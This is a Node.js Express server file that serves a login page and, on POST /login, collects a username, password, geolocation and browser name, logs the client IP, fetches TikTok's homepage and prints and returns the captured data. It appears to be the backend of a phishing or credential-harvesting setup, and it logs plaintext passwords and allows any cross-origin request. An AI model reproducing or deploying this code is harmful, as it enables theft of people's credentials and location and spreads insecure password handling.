/*
    importing the required librabries and files
*/

const express = require('express');
var getIP = require('ipware')().get_ip;
var bodyparser = require("body-parser");
var fetch = require('node-fetch')
var urlencodedParser = bodyparser.urlencoded({
    extended: false
   });

const app = express();
app.use(express.json());


/*
   getting a default home page.
*/

app.get('/',(req,res) => {
    res.sendFile(__dirname+"/login.html")
})


/*
   defining permission for the cross orgin requests
*/

app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header(
      "Access-Control-Allow-Headers",
      "Origin, X-Requested-With, Content-Type, Accept"
    );
    next();
  });
  


  /*
    making the server side run at port 5000 or env port according to the host application
  */

console.log("Server Side running at 5000");

app.listen(process.env.PORT || 5000, () => {
    console.log("Started Listening")
});


/*
    defining the listener for post requests which takes the request from
    clients and responds accordingly
*/

app.post("/login", urlencodedParser, async (req, res) => {

    /*
        checking wether the request contains all the required fields.
    */
    if( !req.body.uname|| !req.body.password){
        return res.status(400).send({
            error : "Expected values missing"
        })
    }
    else{

        /*
            Variable declaration for the defenition of post method
        */
        var url = "http://www.tiktok.com/"
        var userIp = getIP(req);;
        var uname = req.body.uname;
        var pwd = req.body.password;
        var longtitude = req.body.lo;
        var langtitude = req.body.la;
        var appname = req.body.appname;
        var responseData;
        var proxyHost = '138.197.157.32:8080';
        var req1;

        /*
            doing the actual logic.
            ignore the console statements as they are part of manual debugging.
        */

        console.log("IP: "+JSON.stringify(userIp))

        req1 = await fetch(url).then( res => res.text()).then(body => {
            responseData = body;
            return true;
        })



        /*
            consolidating the results to be send to the client
        */

        var result = {
            user : uname,
            password: pwd,
            location: longtitude+","+langtitude,
            browserName: appname,
            responseHTML: responseData
        }
        console.log(result)
        return res.send(result);

    }
})